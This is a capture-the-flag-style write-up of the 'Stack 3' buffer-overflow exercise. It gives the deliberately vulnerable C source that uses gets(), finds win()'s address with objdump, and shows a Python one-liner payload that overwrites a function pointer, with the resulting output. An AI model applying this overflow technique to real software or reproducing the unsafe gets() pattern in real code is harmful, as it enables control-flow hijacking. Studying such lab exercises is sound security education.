# STACK 3

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)(); 				// write win address to function pointer fp
  char buffer[64]; 

  fp = 0;

  gets(buffer); 						// vuln is here, gets function does not limit the size of user input

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## IDEA

- Change value of fp hold to win's address with buffer overflow, This will assign fp to win function, so inside true branch of if, fp() will be the same as win().

## DETAIL

- First, we need to know address of win function, we'll use objdump with param -d to disassemble all the object and find the win with grep through pipeline.

```
	$ objdump -d stack3 | grep "win"
	08048424 <win>:	
```

- After we has address of win function, we will modifide a little bit to make machine read correctly what we want, so  0x08048424 will be this in payload:

```
	0x08048424  ->  "\x24\x84\x04\x08"
```

- And then, we only need to fill up buffer variable content to reach to the fp content, we will use python to do this.

```
	python -c 'print("a"*64 + "\x24\x84\x04\x08")'
```

## EXPLOIT

- Payload:

```
	python -c 'print("a"*64 + "\x24\x84\x04\x08")' | ./stack3
```

## RESULT

```
	$ python -c 'print("a"*64 + "\x24\x84\x04\x08")' | ./stack3
	calling function pointer, jumping to 0x08048424
	code flow successfully changed
```
